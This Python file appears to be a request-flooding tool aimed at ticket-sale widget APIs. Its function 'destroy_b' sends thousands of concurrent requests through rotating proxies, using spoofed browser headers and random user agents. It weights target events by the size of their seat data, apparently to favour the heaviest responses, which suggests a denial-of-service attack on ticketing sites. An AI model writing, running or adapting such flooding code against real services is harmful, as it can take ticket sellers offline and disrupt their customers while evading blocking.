import itertools
import json
import random

import grequests
from loguru import logger

from working_directory.notifiers.a_plan import load_events
from parse_module.manager import user_agent
from parse_module.utils.date import Date


def destroy_b(events,
              weights,
              proxy_reqs,
              child_conn,
              channel=0,
              cycle=0,
              buffer_size=10000,
              print_step=1000,
              threads=1000):
    random.shuffle(proxy_reqs)
    proxy_cycle = itertools.cycle(proxy_reqs)
    if channel == 2:
        channel = 'tester'
        print_step = 1
        threads = 10

    parsed_data = data_cycle(events, weights, buffer_size)
    timeout = 60 if channel == 'tester' else 60
    rs = [grequests.get(url, headers=headers, timeout=timeout, proxies=next(proxy_cycle))
          for url, headers in parsed_data]
    if cycle == 0:
        child_conn.send(None)
        child_conn.recv()
    logger.success(f'{channel} starting...')
    for i, r in grequests.imap_enumerated(rs, size=threads, stream=True):
        if i % print_step != 0:
            continue
        try:
            text = r.text if len(r.text) < 100 else len(r.text)
            url, headers = parsed_data[i]
            logger.info(f'{channel}-{i+cycle*buffer_size} {r.status_code} {text} {r.url} {headers["origin"]} {url}')
        except Exception as err:
            logger.warning(f'{channel}-{i+cycle*buffer_size} Request error {err}')
    logger.debug('destroy_b end')


def data_cycle(events, weights, buffer_size):
    ind = 0
    chosen = random.choices(events, weights=weights, k=buffer_size)
    parsed_data = []
    for event in chosen:
        ind += 1
        if ind % 1000 == 0:
            logger.info(f'Events buffered {ind}')
        url = f'https://widget-api.{event["domain"]}/api/widget/{event["widget"]}/' \
              f'ticket?lang=ru&currency=RUB&event={event["current_id"]}&is_landing=true'
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ru',
            'cache-control': 'no-cache',
            'origin': f'https://{event["domain"]}',
            'pragma': 'no-cache',
            'referer': f'https://widget-frame.{event["domain"]}/',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user_agent.random(),
        }
        row = (url, headers,)
        parsed_data.append(row)
    return parsed_data


def load_landings(events_data, amount=0, random=False):
    raw_events = load_events(events_data, amount=amount, random=random)
    available_ids = set()
    for project in events_data.values():
        for event in project['events']:
            available_ids.add(event['current_id'])

    events = []
    event_weights = []
    today = Date.now()
    day_ind = today.year * 366 + today.month * 31 + today.day
    for raw in raw_events:
        if 'seats' not in raw:
            continue
        if raw['current_id'] not in available_ids:
            continue
        if to_day(raw['date']) <= day_ind:
            continue
        event = {
            'current_id': raw['current_id'],
            'landing': raw['landing'],
            'domain': raw['domain'],
            'widget': raw['widget']
        }
        weight = len(json.dumps(raw['seats']))
        events.append(event)
        event_weights.append(weight)
    logger.info('loaded weights')
    return events, event_weights


def to_day(date):
    ymd, hmin = date.split(' ')
    y, m, d = ymd.split('-')
    return int(y) * 366 + int(m) * 31 + int(d)
